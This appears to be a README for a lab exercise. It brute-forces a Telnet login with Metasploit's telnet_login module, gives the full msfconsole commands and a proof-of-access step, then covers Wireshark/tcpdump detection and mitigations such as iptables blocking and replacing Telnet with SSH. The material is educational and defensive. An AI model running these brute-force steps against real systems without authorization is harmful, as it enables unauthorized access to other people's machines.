# Telnet-Brute-Force-Attack-using-Metasploit-with-Threat-Detection-via-Wireshark
This project demonstrates a brute-force attack on a Telnet service using Metasploit, a penetration testing framework. The goal is to understand how brute-force attacks work, how attackers can exploit weak Telnet credentials, and how to monitor and detect such attacks using a network analysis tool like Wireshark.
# Tools & Environment

Attacker: Kali Linux with Metasploit (msfconsole) — example IP 10.196.201.215.

Victim: Ubuntu/Linux with Telnet service enabled — example IP 10.196.201.145, port 23.

Network analysis: Wireshark / tcpdump to capture Telnet control traffic.

Client: telnet or other Telnet clients to verify credentials.

Mitigation: iptables for immediate blocking; longer-term use secure alternatives.

# quick background

Telnet provides plaintext remote shell access on port 23 by default; usernames, passwords, and session data are unencrypted and visible to network captures.

Metasploit offers auxiliary/scanner/telnet/telnet_login to automate username/password guessing—useful for lab demonstrations of weak credentials.

# Environment prep

Ensure the victim’s Telnet server is running and reachable at 10.196.201.145.

On the attacker (Kali), prepare credential lists (one item per line):

/home/kali/user.txt — candidate usernames (e.g., cisco, analyst)

/home/kali/passwords.txt — candidate passwords (e.g., password, net_secPW)

# Attack — step by step

Start Metasploit:

msfconsole


Configure the Telnet brute-force scanner:

use auxiliary/scanner/telnet/telnet_login
set RHOSTS 10.196.201.145
set RPORT 23
set USER_FILE /home/kali/user.txt
set PASS_FILE /home/kali/passwords.txt
run


The module will try combinations and report successes (e.g., Success: cisco:password123).

Verify access manually:

telnet 10.196.201.145
# enter discovered username/password when prompted


Once logged in, run commands or create a proof file:

echo "Proof: accessed via Metasploit test" > hacked.txt


(Creating hacked.txt is a lab-only proof-of-access step.)

# Evidence capture & analysis (Wireshark / tcpdump)

Capture Telnet traffic on the victim or network tap:

sudo tcpdump -i eth0 -s 0 -w telnet_attack.pcap port 23


Open telnet_attack.pcap in Wireshark. Things to look for:

Plaintext username and password exchanges visible in the capture.

Repeated login attempts indicating brute-force behavior.

A successful login followed by shell commands or file creation (proof-of-access).

Automated timing — many attempts in a short window from one source IP.

Useful Wireshark filters:

tcp.port == 23 — show Telnet traffic.

Use Follow TCP Stream to view the full plaintext interaction for a selected connection.

# Detection indicators

High frequency of connection attempts from the same source IP to port 23.

Repeated failed login lines followed by a successful login.

Plaintext credentials visible in capture files — immediate proof of compromise.

Correlate timestamps between Metasploit output and packet captures to track timeline.

# Mitigation & recommendations
Immediate

Block the attacking IP:

sudo iptables -A INPUT -s <ATTACKER_IP> -p tcp --dport 23 -j DROP
sudo iptables -L INPUT -v -n


Disable Telnet service if not required:

sudo systemctl stop telnet.socket
sudo systemctl disable telnet.socket

Long-term

Replace Telnet with secure alternatives: SSH (SFTP/secure shell).

Enforce strong authentication and credential policies; disable weak accounts.

Use automated banning tools (fail2ban or similar) to block repeated failures.

Restrict remote administration to management networks or specific IPs.

Maintain centralized logging and periodic packet-capture reviews for suspicious behavior.

# Safety & ethics

Only perform these tests in a controlled lab environment or on systems where you have explicit authorization. Unauthorized scanning or brute-force attacks against production/public systems is illegal and unethical.

# Summary

This README guides a controlled Telnet brute-force demonstration using Metasploit, capturing cleartext evidence with Wireshark/tcpdump, verifying access via Telnet client, and applying immediate iptables blocking. The exercise highlights why Telnet is insecure and why secure remote-access practices (SSH, automated bans, restricted access) are essential.
